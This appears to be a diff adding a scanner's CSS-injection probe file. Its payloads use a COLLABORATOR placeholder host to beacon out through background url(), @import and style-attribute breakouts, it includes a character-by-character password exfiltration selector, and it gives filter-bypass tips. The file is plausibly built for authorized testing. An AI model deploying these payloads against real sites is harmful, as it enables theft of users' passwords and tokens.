@@ -1,0 +1,65 @@
+{
+  "category": "cspp",
+  "description": "CSS prototype pollution / CSS custom-property injection — attacker-controlled CSS custom property (--var) leaks data via @import, attribute selectors, or background-image: url() exfiltration.",
+  "contexts": {
+    "custom_property_injection": {
+      "description": "Stored or reflected CSS custom property where attacker controls --variable values that downstream rules consume.",
+      "tech_match": [],
+      "param_match": ["style", "css", "color", "theme", "background", "font", "class"],
+      "probes": [
+        {
+          "payload": "--token: var(--token); background: url(https://COLLABORATOR/?x=foo);",
+          "description": "Inject background-image with Collaborator URL. Replace COLLABORATOR with output of generate_collaborator_payload().",
+          "matchers": [{"type": "regex", "pattern": "background:\\s*url\\("}],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"COLLAB_REQUIRED": true}
+        },
+        {
+          "payload": "@import url('https://COLLABORATOR/inject.css');",
+          "description": "@import injection — exfiltrates the page rendering context to attacker via Collaborator stylesheet load.",
+          "matchers": [{"type": "regex", "pattern": "@import\\s+url"}],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {"COLLAB_REQUIRED": true}
+        },
+        {
+          "payload": "input[type=password][value^='a'] { background: url(https://COLLABORATOR/?c=a); }",
+          "description": "Attribute-selector exfil — stage 1 of CSS-only password / token exfil. Each prefix character triggers different background URL.",
+          "matchers": [{"type": "word", "any": ["input[", "[value^=", "background: url"]}],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"COLLAB_REQUIRED": true}
+        }
+      ]
+    },
+    "style_attribute_injection": {
+      "description": "Reflected style attribute (style=\"...\") where attacker controls a value used in url(), expression(), or behavior() (legacy IE).",
+      "tech_match": [],
+      "param_match": ["style", "color", "size", "width"],
+      "probes": [
+        {
+          "payload": "1px;background:url(//COLLABORATOR/css)",
+          "description": "Break out of style attribute value into a new declaration. Collaborator hit confirms CSS execution.",
+          "matchers": [{"type": "reflection"}, {"type": "word", "any": ["background:url", "background: url"]}],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {"COLLAB_REQUIRED": true}
+        },
+        {
+          "payload": "1px;-moz-binding:url(//COLLABORATOR/x.xml#a)",
+          "description": "Legacy Firefox/Mozilla XBL binding — gone in modern browsers but still served to old clients.",
+          "matchers": [{"type": "reflection"}],
+          "severity": "low",
+          "confidence_boost": 15,
+          "variables": {"COLLAB_REQUIRED": true}
+        }
+      ]
+    }
+  },
+  "craft_guidance": {
+    "when_filters_partial": "If '<' filtered but ':' allowed: try CSS custom properties only. If 'url(' filtered: try @import without parens (rare). If both: only attribute-selector exfil works.",
+    "when_no_collab": "Use observable side-effects: ::before content based on selector, font-family with custom font URL, animation-name leak via DevTools timing.",
+    "verification": "Rule 9a: never use real domains. Use Collaborator subdomain or operator-provided callback (interact.sh, webhook.site). Replace COLLABORATOR placeholder at runtime."
+  }
+}
